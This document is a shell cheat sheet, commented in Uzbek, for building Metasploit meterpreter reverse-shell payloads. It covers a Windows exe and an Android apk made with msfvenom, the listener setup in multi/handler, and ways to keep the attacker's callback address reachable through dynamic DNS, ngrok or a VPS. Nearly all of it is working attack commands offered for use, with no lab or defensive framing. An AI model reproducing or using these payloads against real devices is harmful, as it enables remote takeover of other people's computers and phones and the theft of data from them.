
# ==============================
#  WINDOWS & ANDROID PAYLOADS  
# ==============================

# 💻 WINDOWS PAYLOAD YARATISH - Bu buyruq Windows uchun meterpreter reverse shell yaratadi
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe > payload.exe

# 📱 ANDROID PAYLOAD YARATISH - Android qurilmalar uchun teskari ulanish (reverse shell) hosil qiladi
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o payload.apk

# ==============================
#  LISTENER SOZLASH (METASPLOIT)
# ==============================

# 🎯 METASPLOIT CONSOLE ISHLATISH - Metasploit Framework’ni ochish
msfconsole

# 🌐 METASPLOIT LISTENER ISHLATISH - Windows yoki Android qurilmadan aloqa olish uchun listener sozlash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp  # Windows uchun
set payload android/meterpreter/reverse_tcp  # Android uchun, agar Android'ni ishlatsangiz, shu qatordan "#" ni olib tashlang

set LHOST=YOUR_IP   # O‘z IP’ingizni yozing
set LPORT=4444      # Eshtish uchun portni sozlang
exploit             # Eksploitni ishga tushirish

# ==============================
#  IP MANZILNI ANIQLASH
# ==============================

# 🏠 LOKAL (Ichki) IP MANZILNI KO'RISH
ip a      # Yoki eski usul:
ifconfig  # "wlan0" yoki "eth0" dan keyin "inet" sifatida IP chiqadi

# 🌍 JAMOATCHI (Tashqi) IP MANZILNI TEKSHIRISH
curl ifconfig.me
# Yoki
curl icanhazip.com

# ==============================
#  IP O'ZGARISHINI OLDINI OLISH
# ==============================

# 🔄 IP o‘zgarsa, Metasploit ishlamay qoladi, buni oldini olish uchun:
# 1️⃣ No-IP yoki DynDNS xizmatidan foydalaning
# 2️⃣ Ngrok yoki Serveo orqali tunellash
# 3️⃣ VPS ishlatish (Eng ishonchli yechim)

# 🛠 NO-IP UCHUN (Doimiy domen yaratish)
# https://www.noip.com saytidan ro‘yxatdan o‘ting va domen yarating
# Keyin payload yaratishda o‘z IP’ingiz o‘rniga domeningizni yozing:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=yourname.ddns.net LPORT=4444 -f exe > payload.exe
msfvenom -p android/meterpreter/reverse_tcp LHOST=yourname.ddns.net LPORT=4444 -o payload.apk

# 🏗 NGROK TUNNELING (Agar sizning IP o‘zgarib tursa)
# Ngrok o‘rnating va ishga tushiring:
./ngrok tcp 4444
# Ngrok sizga yangi IP va port beradi, uni LHOST va LPORT sifatida ishlating

# ✅ Shu bilan siz Windows va Android uchun Metasploit payload yaratish va ishlatishga tayyorsiz!
